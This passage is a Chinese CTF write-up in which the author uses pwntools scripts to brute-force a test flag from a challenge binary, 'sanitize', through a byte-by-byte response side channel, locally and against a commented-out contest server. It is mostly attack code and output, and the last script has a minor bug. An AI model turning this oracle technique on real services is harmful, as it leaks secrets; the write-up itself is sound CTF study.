这样理论上我们就能够区分每一个不同的字符了。尝试写爆破脚本：
    from __future__ import print_function
    from pwn import *  
    from time import *
    context.log_level = 'error'
    flag = 'flag{this_is_a_testing_flag_TESTING_0123456P)+_)!@#":}'
    f = open('flag','w+')
    f.write(flag)
    f.close()
    payloads = []
    check = []
    g = open('payload','r')
    h = open('check','r')
    for i in range(0x7f-0x20):
        s = g.read(14)
        payloads.append(s)
        s = h.read(657)
        check.append(s)
    for i in range(5,0x7f):
        for j in range(0x20,0x7f):
            payload = payloads[j-0x20][0:8]+str(i)+payloads[j-0x20][9:]
            p = process('./sanitize')
            p.send(payload)
            s = p.recv()
            p.close()
            payload = payloads[j-0x20+1][0:8]+str(i)+payloads[j-0x20+1][9:]
            p = process('./sanitize')
            p.send(payload)
            r = p.recv()
            p.close()
            if s!= check[j-0x20] and r == check[j-0x20+1]:#这一个字符的payload返回数据相同，下一位不同，它有可能是此字符。
                print(chr(j+1),end = '')
                break
输出：
    "!!""!""""""""!"!"!""!"""""""""&&&&&&&")+")!"#"&"
仔细分析：
我们有了对应的payload和check，假设第五位是't'，它肯定能通过t的那一个check，但也通过了双引号"的check，才会有上面这种情况。也就是说我们拿到了一个必要不充分的条件。
另一方面想，对于不同的字符，能通过的check应当是不同的。
测试一下：
    from __future__ import print_function
    from pwn import *  
    from time import *
    context.log_level = 'error'
    payloads = []
    check = []
    g = open('payload','r')
    h = open('check','r')
    for i in range(0x7f-0x20):
        s = g.read(14)
        payloads.append(s)
        s = h.read(657)
        check.append(s)
    g.close()
    h.close()
    check1 = []
    for i in range(0x7f-0x20):
        check1.append('')
    print(check1)
    print('flag{')
    for ii in  range(0x20,0x7f):
        f = open('flag','w+')
        f.write('flag{'+chr(ii))
        f.close()
        print(chr(ii),end=' ')
        t = open('check2','a')
        for i in range(0x20,0x7f-2):
            payload = payloads[i-0x20][0:8]+str(5)+payloads[i-0x20][9:]
            p = process('./sanitize')
            p.send(payload)
            s = p.recv()
            p.close()
            payload = payloads[i-0x20+1][0:8]+str(5)+payloads[i-0x20+1][9:]
            p = process('./sanitize')
            p.send(payload)
            r = p.recv()
            p.close()
            if s!= check[i-0x20] and r == check[i-0x20+1]:
                t.write(chr(i+1))
                print(chr(i+1),end = '')
        t.write('\n') 
        t.close()       
        print('')
部分输出
    p "%(,/259>ADHQp
    q "%(,/259>ADHQq
    r "%(,/2579>ADHQr
    s "%(,/2579>ADHQs
    t "%(,/2579>ADHQt
    u "%(,/2579>ADHQu
    v "%(,/2579>ADHQv
    w "%(,/2579>ADHQw
可以看到，对于字符't'，它确实通过了t的check，但同时也通过了对其他一些字符的check。
同时可以发现，左边的字符和右边的字符串是一一对应的（或许会有重复，但一般就两到三个重复）。
有了一一对应的关系，就能爆破出flag了
    from __future__ import print_function
    from pwn import *  
    from time import *
    context.log_level = 'error'
    flag = 'flag{this_is_a_testing_flag_TESTING_0123456P)+_)!@#":}'
    f = open('flag','w+')
    f.write(flag)
    f.close()
    payloads = []
    check = []
    check2 = []
    result = []
    g = open('payload','r')
    h = open('check','r')
    t = open('check2','r')
    for i in range(0x7f-0x20):
        s = g.read(14)
        payloads.append(s)
        s = h.read(657)
        check.append(s)
        s = t.readline()
        check2.append(s[0:-1])
        result.append('')
    flag = 'flag{'
    for i in range(5,0x7f):
        for j in range(0x20,0x7f-2):
            payload = payloads[j-0x20][0:8]+str(i)+payloads[j-0x20][9:]
            # p = process('./sanitize')
            # p = remote("111.186.63.16",20193)
            p.send(payload)
            s = p.recv()
            p.close()
            payload = payloads[j-0x20+1][0:8]+str(i)+payloads[j-0x20+1][9:]
            p = process('./sanitize')
            # p = remote("111.186.63.16",20193)
            p.send(payload)
            r = p.recv()
            p.close()
            if s!= check[j-0x20] and r == check[j-0x20+1]:
                print(chr(j+1),end = '')
                result[i-5]+=(chr(j+1))
        print('')
        flag+=chr(check2.index(result[i-5])+0x20)
        print(flag)
部分输出：
    flag{this_is_a_testing_flag_TESTING_0123456P)+)!
    flag{this_is_a_testing_flag_TESTING_0123456P)+)!@
    flag{this_is_a_testing_flag_TESTING_0123456P)+)!@#
    flag{this_is_a_testing_flag_TESTING_0123456P)+)!@#"
    flag{this_is_a_testing_flag_TESTING_0123456P)+)!@#":
    flag{this_is_a_testing_flag_TESTING_0123456P)+_)!@#":}
本地能打远程也能打，不过速度比本地慢，五分钟内应该能爆完= =
总感觉我的方法有些取巧，这题还有很多地方没搞懂，期待官方writeup以及各位大佬的讲解。